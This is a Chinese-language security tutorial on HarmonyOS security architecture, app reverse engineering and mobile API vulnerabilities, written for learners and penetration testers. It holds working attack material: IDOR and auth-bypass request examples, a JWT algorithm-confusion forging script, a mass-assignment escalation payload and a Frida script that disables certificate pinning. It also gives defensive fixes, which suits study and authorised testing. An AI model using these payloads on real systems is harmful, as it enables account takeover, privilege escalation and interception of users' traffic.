# 鸿蒙系统安全与移动 API 安全

> 本文档详细讲解 HarmonyOS（鸿蒙）安全架构与应用安全机制、鸿蒙逆向分析方法，以及移动 API 安全的常见漏洞、测试方法和最佳实践，面向安全学习者和渗透测试人员。

---

## 一、HarmonyOS 安全架构

### 1.1 安全架构总览

HarmonyOS（鸿蒙操作系统）是华为推出的面向全场景的分布式操作系统，其安全架构从底层硬件信任根到上层应用沙箱，构建了纵深防御体系。

```
┌─────────────────────────────────────────────────┐
│              应用层安全                           │
│  应用沙箱 / 权限模型 / 应用签名 / Stage模型安全    │
├─────────────────────────────────────────────────┤
│              安全子系统层                          │
│  数字证书管理 / 密钥管理 / 设备认证 / 访问控制      │
├─────────────────────────────────────────────────┤
│              TEE 安全可信执行环境                  │
│  TrustZone / 安全存储 / 安全OS / 密码学服务        │
├─────────────────────────────────────────────────┤
│              安全启动链                            │
│  Boot ROM → Bootloader → Kernel → OS → 应用       │
├─────────────────────────────────────────────────┤
│              硬件信任根                            │
│  eFuse / 安全芯片 / 硬件密钥                      │
└─────────────────────────────────────────────────┘
```

### 1.2 安全可信执行环境（TEE）

**TEE（Trusted Execution Environment）** 是鸿蒙安全架构的核心基石，基于 ARM TrustZone 技术实现，将处理器分为安全世界（Secure World）和非安全世界（Normal World）。

**TEE 的核心特性**：

| 特性 | 说明 |
|------|------|
| 隔离执行 | 安全世界与非安全世界的内存和硬件完全隔离 |
| 安全存储 | 密钥、凭据等敏感数据存储在 TEE 安全存储区 |
| 密码学服务 | 提供硬件级加密、签名、哈希等密码学运算 |
| 可信应用（TA） | 运行在 TEE 中的可信应用，如指纹认证、支付验证 |
| 安全时钟 | 提供防篡改的可信时间源 |

**TEE 与 REE 的交互流程**：

```
非安全世界 (REE - Rich Execution Environment)
┌──────────────────────────┐
│  普通应用 (CA - Client App)  │
│  普通操作系统 (HarmonyOS)    │
└────────────┬─────────────┘
             │ SMC 指令 / 系统调用
             ▼
安全世界 (TEE - Trusted Execution Environment)
┌──────────────────────────┐
│  可信应用 (TA - Trusted App)  │
│  安全OS (Trusted OS)         │
│  安全存储 / 密码学引擎         │
└──────────────────────────┘
```

**鸿蒙 TEE 的典型应用场景**：

- 指纹/人脸生物特征数据的安全存储与比对
- 支付密钥的安全管理
- DRM 内容保护
- 设备间安全认证（分布式安全组网）

### 1.3 安全子系统

鸿蒙的安全子系统负责系统级安全服务，包含以下核心模块：

**（1）数字证书管理子系统**

负责设备证书的申请、存储、验证和撤销。鸿蒙设备使用设备唯一证书进行身份认证。

```json
{
  "deviceCert": {
    "subject": "CN=HarmonyOS-Device-001",
    "issuer": "CN=Huawei-HarmonyOS-CA",
    "serialNumber": "0x1234567890ABCDEF",
    "validity": "2026-01-01 to 2031-12-31",
    "keyUsage": ["digitalSignature", "keyEncipherment"],
    "publicKey": "ECDSA-P256"
  }
}
```

**（2）密钥管理子系统**

基于 TEE 的硬件级密钥管理，支持：

- 密钥生成（RSA、ECDSA、AES、HMAC 等）
- 密钥安全存储（密钥永不出 TEE）
- 密钥使用（签名、验签、加密、解密）
- 密钥轮换与撤销

**（3）设备认证子系统**

鸿蒙分布式安全组网的核心，实现设备间的双向认证：

```
设备A                          设备B
  │                              │
  │ 1. 发起认证请求               │
  │ ────────────────────────────→│
  │                              │
  │ 2. 交换设备证书               │
  │ ←────────────────────────────│
  │ ────────────────────────────→│
  │                              │
  │ 3. 挑战-响应认证             │
  │ ←────────────────────────────│
  │ ────────────────────────────→│
  │                              │
  │ 4. 建立安全通道 (TLS)        │
  │ ←───────────────────────────→│
  │                              │
```

**（4）访问控制子系统**

基于权限的访问控制（PBAC）和基于角色的访问控制（RBAC），控制应用和用户对系统资源的访问。

### 1.4 安全启动链

鸿蒙采用从硬件信任根到应用层的逐级验证启动链，确保每个环节的完整性：

```
┌──────────────┐    验证    ┌──────────────┐    验证    ┌──────────────┐
│  Boot ROM    │ ────────→ │ Bootloader   │ ────────→ │  Kernel      │
│ (固化在芯片) │            │ (U-Boot等)   │            │ (HarmonyOS)  │
└──────────────┘            └──────────────┘            └──────────────┘
       │                                                        │ 验证
       │                                                   ┌──────────────┐
       │                                                   │  系统服务     │
       │                                                   └──────────────┘
       │                                                        │ 验证
       │                                                   ┌──────────────┐
       │                                                   │  应用程序     │
       │                                                   └──────────────┘
```

**启动链各环节**：

| 环节 | 信任来源 | 验证内容 |
|------|----------|----------|
| Boot ROM | eFuse 中的公钥哈希 | Bootloader 镜像签名 |
| Bootloader | Boot ROM 传递的信任 | Kernel 镜像签名 |
| Kernel | Bootloader 传递的信任 | 系统服务模块签名 |
| 系统服务 | Kernel 传递的信任 | 应用 HAP 包签名 |
| 应用 | 系统服务验证 | 应用代码完整性 |

**eFuse 硬件信任根**：eFuse 是一次性可编程存储器，在芯片制造时烧入华为根公钥的哈希值，不可篡改。Boot ROM 启动时读取 eFuse 中的哈希值，验证 Bootloader 的签名。

### 1.5 应用沙箱机制

鸿蒙的应用沙箱通过 Linux 内核的命名空间（Namespace）和安全沙箱（Seccomp）实现应用间隔离：

**沙箱隔离维度**：

- **进程隔离**：每个应用运行在独立的进程空间
- **文件系统隔离**：每个应用只能访问自己的沙箱目录
- **权限隔离**：应用只能访问已授权的系统资源
- **网络隔离**：基于 UID 的网络访问控制

```
应用沙箱目录结构：
/data/app/el2/
├── bundle/              # 应用安装包数据
├── base/                # 应用基础数据
│   ├── {bundleName}/    # 按应用包名隔离
│   │   ├── files/       # 应用文件
│   │   ├── cache/       # 缓存数据
│   │   ├── databases/   # 数据库
│   │   └── preferences/ # 偏好设置
│   │   └── el2/         # 加密等级2数据
└── log/                 # 应用日志
```

---

## 二、鸿蒙应用安全机制

### 2.1 HAP 包结构

HAP（Harmony Ability Package）是鸿蒙应用的安装包格式，一个应用可以包含多个 HAP 模块。

```
MyApp.hap
├── module.json              # 模块配置文件（核心）
├── config.json              # 兼容配置文件（旧版API）
├── abilities/               # Ability 编译产物
│   └── main.abc            # ArkTS 编译后的 ABC 字节码
├── resources/              # 资源文件
│   ├── base/               # 基础资源
│   └── zh_CN/              # 中文资源
├── libs/                   # 动态库
│   ├── arm64-v8a/          # ARM64 架构 SO 库
│   └── armeabi-v7a/       # ARM32 架构 SO 库
├── assets/                 # 原始资源
├── pack.info               # 打包信息
└── resources.index         # 资源索引文件
```

**module.json 关键安全字段**：

```json
{
  "module": {
    "name": "entry",
    "type": "entry",
    "deviceTypes": ["phone", "tablet"],
    "abilities": [
      {
        "name": "EntryAbility",
        "type": "UIAbility",
        "exported": true,
        "skills": [
          {
            "actions": ["action.system.home"],
            "entities": ["entity.system.home"]
          }
        ]
      }
    ],
    "requestPermissions": [
      {
        "name": "ohos.permission.INTERNET",
        "reason": "$string:internet_reason",
        "usedScene": {
          "abilities": ["EntryAbility"],
          "when": "always"
        }
      },
      {
        "name": "ohos.permission.READ_MEDIA",
        "reason": "$string:read_media_reason",
        "usedScene": {
          "abilities": ["EntryAbility"],
          "when": "inuse"
        }
      }
    ]
  }
}
```

### 2.2 应用签名机制

鸿蒙应用必须经过数字签名才能安装运行，签名采用 PKI 体系：

**签名验证流程**：

```
开发者                    华为签名服务器              鸿蒙设备
  │                          │                        │
  │ 1. 生成密钥对             │                        │
  │ 2. 提交CSR               │                        │
  │ ────────────────────────→│                        │
  │                          │                        │
  │ 3. 颁发开发者证书         │                        │
  │ ←────────────────────────│                        │
  │                          │                        │
  │ 4. 签名HAP包             │                        │
  │    (使用开发者私钥)      │                        │
  │                          │                        │
  │ 5. 上传应用市场          │                        │
  │ ────────────────────────────────────────────────→│
  │                          │                        │
  │                          │ 6. 验证签名链           │
  │                          │    华为根CA→开发者证书   │
  │                          │    →HAP签名             │
  │                          │ 7. 安装运行             │
```

**签名验证的关键检查点**：

- 证书链完整性（根 CA → 中间 CA → 开发者证书）
- 证书有效期
- 证书吊销状态（CRL/OCSP）
- HAP 包完整性（SHA-256 哈希）
- 签名算法安全性（RSA-2048+ 或 ECDSA-P256+）

### 2.3 权限模型

鸿蒙的权限模型分为三个安全等级：

| 权限等级 | 说明 | 用户交互 | 示例 |
|----------|------|----------|------|
| normal | 普通权限，低风险 | 安装时自动授予 | 网络访问、振动 |
| user_basic | 用户基本权限，中风险 | 动态申请，用户确认 | 读取媒体文件 |
| user_sensitive | 敏感权限，高风险 | 动态申请，系统弹窗 | 位置、麦克风、联系人 |

**权限申请代码示例（ArkTS）**：

```typescript
import abilityAccessCtrl, { Permissions } from '@ohos.abilityAccessCtrl';

// 申请位置权限
async function requestLocationPermission(): Promise<boolean> {
  const atManager = abilityAccessCtrl.createAtManager();
  const permissions: Array<Permissions> = [
    'ohos.permission.APPROXIMATELY_LOCATION',
    'ohos.permission.LOCATION'
  ];
  
  try {
    const result = await atManager.requestPermissionsFromUser(
      globalThis.context,
      permissions
    );
    
    // 检查是否所有权限都被授予
    const allGranted = result.authStatuses.every(
      status => status === 0 // 0 表示已授权
    );
    return allGranted;
  } catch (err) {
    console.error(`权限申请失败: ${JSON.stringify(err)}`);
    return false;
  }
}
```

**权限安全要点**：

- 最小权限原则：只申请必要的权限
- 权限使用场景声明：必须声明每个权限的使用场景
- 权限动态校验：使用前检查权限是否有效
- 权限降级处理：用户拒绝权限后应有合理的降级逻辑

### 2.4 Stage 模型安全

鸿蒙 Stage 模型是 API 9 引入的新应用开发模型，相比旧版 FA 模型，安全能力更完善：

**Stage 模型的安全特性**：

- **Ability 生命周期管控**：UIAbility 和 ExtensionAbility 有严格的生命周期
- **跨 Ability 通信安全**：通过 Want 参数和权限校验控制跨 Ability 调用
- **应用上下文隔离**：每个 Ability 有独立的 Context，资源访问受沙箱限制
- **ExtensionAbility 权限管控**：后台服务 Ability 需要声明权限才能被调用

```typescript
// Stage 模型中跨 Ability 调用的安全示例
import Want from '@ohos.app.ability.Want';

// 发起 Ability 调用 - 需要指定目标 Ability 和权限
function startSecureAbility(): void {
  const want: Want = {
    bundleName: 'com.example.targetapp',
    abilityName: 'SecureServiceAbility',
    action: 'action.secure.operation',
    parameters: {
      'requestId': crypto.randomUUID(),
      'timestamp': Date.now()
    }
  };
  
  // 目标 Ability 需要声明 ohos.permission.SECURE_CALL 权限
  // 才能被调用
  globalThis.context.startAbility(want)
    .then(() => {
      console.info('Ability 调用成功');
    })
    .catch((err) => {
      console.error(`Ability 调用失败: ${JSON.stringify(err)}`);
    });
}
```

---

## 三、鸿蒙逆向分析

### 3.1 HAP 解包

HAP 文件本质上是 ZIP 格式，可以使用解压工具直接解包：

```bash
# 方式1：使用 unzip 解包
unzip MyApp.hap -d MyApp_extracted

# 方式2：使用 7z 解包
7z x MyApp.hap -oMyApp_extracted

# 解包后的目录结构
# ├── module.json          # 模块配置
# ├── abilities/
# │   └── main.abc         # ArkTS 字节码
# ├── libs/
# │   └── arm64-v8a/
# │       └── libnative.so # 原生库
# └── resources/
```

### 3.2 ABC 文件分析

ABC（Ark Binary Container）是 ArkTS/Ark 语言的编译产物，类似 Android 的 DEX 文件。

**ABC 文件结构**：

```
ABC 文件格式
├── 文件头 (Magic + Version)
├── 常量池 (Constant Pool)
│   ├── 字符串常量
│   ├── 数字常量
│   └── 类/方法描述符
├── 类定义区 (Class Definition)
│   ├── 类名
│   ├── 字段列表
│   └── 方法列表
├── 方法字节码 (Method Bytecode)
└── 调试信息 (Debug Info)
```

**使用 DevEco Studio 的 ABC 反编译工具**：

```bash
# 使用 ark_disasm 工具反汇编 ABC 文件
# 该工具随 DevEco Studio SDK 提供
ark_disasm --disassemble main.abc > main_disasm.txt

# 输出示例：
# .function main.() {
#   ldai 0x0
#   sta v0
#   ldai 0x1
#   sta v1
#   add v0, v1
#   sta v0
#   return v0
# }
```

### 3.3 DevEco Studio 调试

DevEco Studio 是鸿蒙官方 IDE，提供安全调试功能：

**调试模式下的安全检查**：

- 调试需要应用以 Debug 模式签名
- 非 Debug 签名的应用无法附加调试器
- 调试连接需要设备开发者模式授权

```bash
# 使用 hdc（HarmonyOS Device Connector）调试
hdc shell                      # 进入设备 shell
hdc file send local.hap /data/ # 推送 HAP 到设备
hdc install local.hap          # 安装应用
hdc shell bm dump -n com.example.app  # 查看应用信息

# 查看应用沙箱数据
hdc shell
# 进入 shell 后
cd /data/app/el2/base/com.example.app/files
ls -la

# 抓取日志
hdc shell hilog | grep "com.example.app"
```

### 3.4 原生库（SO）逆向

鸿蒙应用中的 Native 代码以 SO 库形式存在，可以使用标准逆向工具分析：

```bash
# 使用 readelf 查看 SO 信息
readelf -h libnative.so

# 使用 objdump 反汇编
arm-linux-ohos-objdump -d libnative.so > disasm.txt

# 使用 Ghidra 或 IDA Pro 分析
# 需要加载 ARM64 架构支持
# Ghidra:
#   File -> Import -> 选择 libnative.so
#   设置语言为 AARCH64:LE:64:v8A
```

---

## 四、移动 API 安全概述

### 4.1 REST API 安全

移动应用后端通常采用 REST API 进行通信，API 安全是移动安全的重要组成部分。

**REST API 安全要素**：

| 要素 | 说明 | 示例 |
|------|------|------|
| 传输安全 | HTTPS 强制，TLS 1.2+ | HSTS 头 |
| 认证 | Token/Session 认证 | OAuth 2.0 / JWT |
| 授权 | 资源级访问控制 | RBAC / ABAC |
| 输入验证 | 防注入攻击 | 参数白名单 |
| 速率限制 | 防暴力破解 | 5次/分钟 |
| 审计日志 | 操作可追溯 | 全量请求日志 |

### 4.2 GraphQL API 安全

GraphQL 作为灵活的查询语言，引入了新的安全挑战：

```graphql
# GraphQL 查询 - 可能导致信息过度暴露
query {
  user(id: 1) {
    id
    name
    email
    phone
    passwordHash    # 敏感字段不应暴露
    creditCard      # 敏感字段不应暴露
    orders {
      id
      amount
      billingAddress  # 敏感字段
    }
  }
}

# 深度嵌套查询 - 可能导致 DoS
query {
  user {
    friends {
      friends {
        friends {
          friends {
            # 无限嵌套导致资源耗尽
          }
        }
      }
    }
  }
}
```

**GraphQL 安全防护**：

- 查询深度限制（Max Depth）
- 查询复杂度分析（Cost Analysis）
- 字段级权限控制
- 查询白名单（Persisted Queries）
- 速率限制

### 4.3 API 认证授权机制

**常见 API 认证方式对比**：

| 方式 | 原理 | 优点 | 缺点 |
|------|------|------|------|
| Basic Auth | Base64 编码用户名密码 | 简单 | 不安全，明文传输 |
| Session Cookie | 服务端 Session + Cookie | 成熟可靠 | 不适合移动端/分布式 |
| Bearer Token | 携带 Token 访问 | 无状态，适合移动端 | Token 泄露风险 |
| OAuth 2.0 | 授权码流程 | 标准化，安全性高 | 实现复杂 |
| JWT | 自包含 Token | 无状态，可验证 | 无法主动失效 |

---

## 五、移动 API 常见漏洞

### 5.1 BOLA / IDOR（越权访问）

**BOLA（Broken Object Level Authorization）** 即对象级授权失效，是 API 安全的首要威胁。攻击者通过修改请求中的对象 ID，访问无权访问的资源。

**漏洞示例**：

```http
# 正常请求 - 获取自己的订单
GET /api/v1/orders/1001 HTTP/1.1
Authorization: B eyer user_token_abc123

# 攻击者尝试遍历订单ID
GET /api/v1/orders/1002 HTTP/1.1
Authorization: Bearer user_token_abc123
# 如果服务端未校验订单所有者，则越权访问成功

# 批量遍历
GET /api/v1/orders/1003
GET /api/v1/orders/1004
GET /api/v1/orders/1005
```

**修复方案**：

```python
# 错误代码 - 仅验证Token，未验证资源所有权
@app.route('/api/v1/orders/<int:order_id>')
def get_order(order_id):
    user = verify_token(request.headers['Authorization'])
    order = Order.query.get(order_id)  # 未检查所有者
    return jsonify(order.to_dict())

# 正确代码 - 验证资源所有权
@app.route('/api/v1/orders/<int:order_id>')
@auth_required
def get_order(order_id):
    user = g.current_user
    order = Order.query.filter_by(
        id=order_id,
        user_id=user.id  # 确保订单属于当前用户
    ).first_or_404()
    return jsonify(order.to_dict())
```

### 5.2 认证绕过

**常见认证绕过方式**：

```http
# 方式1：修改 HTTP 方法
GET /api/v1/admin/users HTTP/1.1
# 改为
POST /api/v1/admin/users HTTP/1.1  # 某些实现只验证 GET

# 方式2：路径遍历
GET /api/v1/../v1/admin/users HTTP/1.1
GET /api/v1/users/../../admin/users HTTP/1.1

# 方式3：大小写绕过
GET /API/V1/Admin/Users HTTP/1.1
GET /api/v1/ADMIN/users HTTP/1.1

# 方式4：空字节绕过
GET /api/v1/admin/users%00 HTTP/1.1

# 方式5：参数污染
GET /api/v1/users?role=user&role=admin HTTP/1.1
```

### 5.3 JWT 攻击

JWT（JSON Web Token）由 Header、Payload、Signature 三部分组成，常见攻击面包括：

**（1）算法篡改攻击**

```python
# 攻击：将 RS256 算法改为 HS256，用公钥作为 HMAC 密钥
import base64
import json
import hmac
import hashlib

# 原始 JWT
original_jwt = "eyJhbGc..."

# 解码 Header
header = {"alg": "HS256", "typ": "JWT"}  # 将 RS256 改为 HS256
payload = {"sub": "admin", "role": "superadmin", "exp": 9999999999}

# 使用服务器的 RSA 公钥作为 HMAC 密钥签名
public_key = open("server_pub.pem").read()
encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
message = encoded_header + b'.' + encoded_payload
signature = hmac.new(public_key.encode(), message, hashlib.sha256).digest()
encoded_signature = base64.urlsafe_b64encode(signature).rstrip(b'=')

forged_jwt = message.decode() + '.' + encoded_signature.decode()
# 如果服务端用公钥验证 HS256 签名，则伪造的 JWT 会被接受
```

**（2）None 算法绕过**

```json
// 将算法设置为 "none"，省略签名部分
{"alg": "none", "typ": "JWT"}
.
{"sub": "admin", "role": "superadmin"}
.
// 空签名
```

**JWT 安全最佳实践**：

- 禁止 `alg: none`
- 固定签名算法，不信任 Header 中的 `alg` 字段
- 设置合理的过期时间（exp）
- 使用强密钥（RS256 使用 2048+ 位密钥）
- 实施 Token 吊销机制

### 5.4 Mass Assignment（批量赋值）

```http
# 正常请求 - 更新用户昵称
PUT /api/v1/users/me HTTP/1.1
Content-Type: application/json

{
  "nickname": "NewName"
}

# 攻击 - 尝试修改角色和状态
PUT /api/v1/users/me HTTP/1.1
Content-Type: application/json

{
  "nickname": "NewName",
  "role": "admin",           # 提权
  "isVerified": true,        # 绕过验证
  "balance": 99999999        # 篡改余额
}
```

**修复方案 - 白名单更新**：

```python
# 正确做法 - 只允许更新白名单字段
ALLOWED_FIELDS = {'nickname', 'avatar', 'bio'}

@app.route('/api/v1/users/me', methods=['PUT'])
@auth_required
def update_profile():
    user = g.current_user
    data = request.get_json()
    
    # 过滤只允许更新的字段
    filtered = {k: v for k, v in data.items() if k in ALLOWED_FIELDS}
    
    for key, value in filtered.items():
        setattr(user, key, value)
    
    db.session.commit()
    return jsonify(user.to_dict())
```

---

## 六、移动 API 安全测试方法

### 6.1 Burp Suite 移动端代理配置

**配置步骤**：

```
1. Burp Suite 设置代理监听
   Proxy -> Options -> Add
   - Bind to port: 8082
   - Bind to address: All interfaces
   
2. 移动设备 WiFi 代理设置
   - 设置 -> WiFi -> 修改网络 -> 高级
   - 代理: 手动
   - 主机名: <电脑IP>
   - 端口: 8082
   
3. 安装 Burp CA 证书
   - 访问 http://burp
   - 下载 cacert.der
   - Android: 设置 -> 安全 -> 安装证书
   - iOS: 设置 -> 通用 -> VPN与设备管理 -> 安装证书
   
4. Android 7+ 额外配置（应用不信任用户证书）
   - 方式1: Root 后将证书安装到系统证书目录
   - 方式2: 在应用的 network_security_config.xml 中信任用户证书
   - 方式3: 使用 Frida 绕过证书绑定
```

### 6.2 证书绑定绕过

**证书绑定（Certificate Pinning）** 阻止中间人代理抓包，需要绕过后才能测试 API。

**Frida 绕过 SSL Pinning 通用脚本**：

```javascript
// frida_ssl_pinning_bypass.js
// 适用于 Android 应用

Java.perform(function() {
    console.log('[*] 开始绕过 SSL Pinning...');

    // 绕过 OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List')
            .implementation = function(hostname, peerCertificates) {
            console.log('[+] OkHttp3 CertificatePinner.check 被绕过: ' + hostname);
            return;
        };
    } catch (e) {
        console.log('[-] OkHttp3 未找到: ' + e);
    }

    // 绕过 TrustManagerImpl
    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        
        var TrustManager = Java.registerClass({
            name: 'com.frida.TrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });
        
        var TrustManagerArray = Java.array('javax.net.ssl.TrustManager', [
            new TrustManager()
        ]);
        
        var initSSLContext = SSLContext.init.overload(
            '[Ljavax.net.ssl.KeyManager;',
            '[Ljavax.net.ssl.TrustManager;',
            'java.security.SecureRandom'
        );
        initSSLContext.implementation = function(km, tm, sr) {
            console.log('[+] SSLContext.init 被替换');
            initSSLContext.call(this, km, TrustManagerArray, sr);
        };
    } catch (e) {
        console.log('[-] TrustManager 绕过失败: ' + e);
    }

    // 绕过 Conscrypt（Android 8+ 默认 TLS 提供者）
    try {
        var Conscrypt = Java.use('com.android.org.conscrypt.Conscrypt');
        Conscrypt.checkServerTrusted.overload(
            'javax.net.ssl.SSLSocket',
            'java.lang.String',
            'java.util.List'
        ).implementation = function(sslSocket, hostname, peerCertificates) {
            console.log('[+] Conscrypt 验证被绕过: ' + hostname);
            return;
        };
    } catch (e) {}
});

// 使用 objection 自动绕过：
// objection -g com.example.app explore
# android sslpinning disable
```

---

## 七、移动后端安全

### 7.1 MBaaS 安全

MBaaS（Mobile Backend as a Service）为移动应用提供后端服务，常见安全风险：

| 风险 | 说明 | 防护 |
|------|------|------|
| API Key 泄露 | 客户端硬编码 API Key | 使用动态令牌，服务端校验 |
| 数据过度暴露 | API 返回过多字段 | 响应字段白名单 |
| 后台逻辑泄露 | 客户端承担服务端逻辑 | 敏感逻辑服务端实现 |
| 未授权 API 调用 | API 缺少认证 | 强制 Token 校验 |

### 7.2 云函数安全

Serverless 云函数在移动后端中广泛使用：

```javascript
// 云函数安全示例 - 微信云函数
const cloud = require('wx-server-sdk');
cloud.init();

exports.main = async (event, context) => {
  const wxContext = cloud.getWXContext();
  
  // 安全检查1：验证调用者身份
  if (!wxContext.OPENID) {
    return { code: 401, message: '未授权访问' };
  }
  
  // 安全检查2：输入验证
  const { orderId } = event;
  if (!orderId || typeof orderId !== 'string') {
    return { code: 400, message: '参数错误' };
  }
  
  // 安全检查3：资源所有权验证
  const db = cloud.database();
  const order = await db.collection('orders').doc(orderId).get();
  
  if (order.data._openid !== wxContext.OPENID) {
    return { code: 403, message: '无权访问该订单' };
  }
  
  // 安全检查4：速率限制（使用 Redis 计数）
  // const count = await redis.incr(`rate:${wxContext.OPENID}`);
  // if (count > 100) return { code: 429, message: '请求过于频繁' };
  
  return { code: 200, data: order.data };
};
```

### 7.3 API 网关安全

API 网关是移动 API 安全的统一入口，核心安全能力：

```
移动应用 → API 网关 → 后端微服务
              │
              ├── 认证鉴权（JWT/OAuth2 验证）
              ├── 速率限制（令牌桶/滑动窗口）
              ├── 请求过滤（WAF 规则）
              ├── 响应过滤（数据脱敏）
              ├── 日志审计（全量请求记录）
              ├── API 版本管理
              └── 熔断降级
```

**API 网关安全配置示例（Kong）**：

```yaml
# Kong API 网关安全配置
services:
  - name: mobile-api
    url: http://backend-service:8080/api
    routes:
      - name: mobile-api-route
        paths: ['/api/v1']
        methods: ['GET', 'POST', 'PUT', 'DELETE']

plugins:
  # JWT 认证
  - name: jwt
    service: mobile-api
    config:
      secret_is_base64: true
      claims_to_verify: ['exp']
  
  # 速率限制
  - name: rate-limiting
    service: mobile-api
    config:
      minute: 60
      hour: 1000
      policy: redis
      redis:
        host: redis-host
        port: 6379
  
  # 请求大小限制
  - name: request-size-limiting
    service: mobile-api
    config:
      allowed_payload_size: 10  # MB
  
  # IP 黑白名单
  - name: ip-restriction
    service: mobile-api
    config:
      blacklist: ['1.2.3.4']
```

---

## 八、安全最佳实践

### 8.1 鸿蒙应用安全清单

- [ ] 使用最新 API（Stage 模型，API 9+）
- [ ] 申请最小必要权限
- [ ] 敏感数据存储使用加密等级目录（el2）
- [ ] 网络通信使用 HTTPS，启用证书绑定
- [ ] 使用 TEE 密钥管理 API 存储密钥
- [ ] 正确签名应用（Debug 和 Release 分别签名）
- [ ] 代码混淆，不硬编码密钥
- [ ] 完整性校验，防篡改

### 8.2 移动 API 安全清单

- [ ] 强制 HTTPS，禁用 HTTP 回退
- [ ] 实现 OAuth 2.0 / JWT 认证
- [ ] 每个资源操作验证所有权（防 BOLA）
- [ ] 输入验证和参数白名单（防 Mass Assignment）
- [ ] 速率限制和防暴力破解
- [ ] 响应数据最小化，不返回多余字段
- [ ] 敏感字段脱敏
- [ ] 全量审计日志
- [ ] API 版本管理
- [ ] 定期安全测试（SAST/DAST）

### 8.3 安全测试工具推荐

| 工具 | 用途 | 适用平台 |
|------|------|----------|
| Burp Suite | API 抓包与测试 | Android/iOS |
| Frida | 动态 Hook 与绕过 | Android/iOS/鸿蒙 |
| Postman | API 功能测试 | 跨平台 |
| OWASP ZAP | API 自动化扫描 | 跨平台 |
| Kiterunner | API 端点发现 | 跨平台 |
| JWT Tool | JWT 漏洞测试 | 跨平台 |
| hdc | 鸿蒙设备调试 | 鸿蒙 |
| ark_disasm | ABC 字节码反汇编 | 鸿蒙 |

---

> **学习建议**：鸿蒙安全是一个快速发展的领域，建议关注华为开发者官方文档和安全公告，结合实际设备进行逆向分析练习。移动 API 安全方面，建议深入研读 OWASP API Security Top 10，并在靶场环境中复现各种漏洞类型。
